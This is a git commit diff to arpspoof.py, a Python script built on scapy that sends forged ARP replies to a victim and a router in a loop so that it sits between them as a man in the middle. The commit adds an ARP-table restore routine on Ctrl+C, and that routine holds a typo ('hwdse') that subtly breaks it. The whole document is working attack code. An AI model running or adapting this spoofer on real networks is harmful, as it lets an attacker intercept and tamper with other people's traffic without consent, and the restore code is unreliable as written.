65c44ff61405e2203bb7ca7e018caddb53697aa8
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-08-22 05:03:44 -0400

    Exception Handled with ARP table restoring fun()

--- arpspoof.py
+++ arpspoof.py
@@ -9,16 +9,27 @@ def get_mac(ip):
     arp_broad_req = broadcast/arp_req
     live = scapy.srp(arp_broad_req, timeout=1, verbose=False)[0]
     return live[0][1].hwsrc
-def arpsend(target_ip, src_ip):
+def arpsend(target_ip, spoof_ip):
     target_addr = get_mac(target_ip)
-    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_addr, psrc=src_ip)
+    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_addr, psrc=spoof_ip)
     scapy.send(arp_packet, verbose=False)
+def arp_restore(dest_ip, src_ip):
+    dest_addr = get_mac(dest_ip)
+    src_addr = get_mac(src_ip)
+    arp_packet = scapy.ARP(op=2, pdst=dest_ip, hwdse=dest_addr, psrc=src_ip, hwsrc=src_addr)
+    scapy.send(arp_packet, verbose=False, count=4)
 
 packet_count = 0
-while True:
-    arpsend(victim_ip, router_ip)
-    arpsend(router_ip, victim_ip)
-    packet_count += 2
-    print("\rSpoofing...sent " + str(packet_count) + " packets"),
-    sys.stdout.flush()
-    time.sleep(2)
+try:
+    while True:
+        arpsend(victim_ip, router_ip)
+        arpsend(router_ip, victim_ip)
+        packet_count += 2
+        print("\r[+] Spoofing...sent " + str(packet_count) + " packets"),
+        sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("[-] Detected CTRL + C....Restoring ARP Table, Please wait....")
+    arp_restore(victim_ip, router_ip)
+    arp_restore(router_ip, victim_ip)
+    print("[+] ARP Spoofing Stopped.")
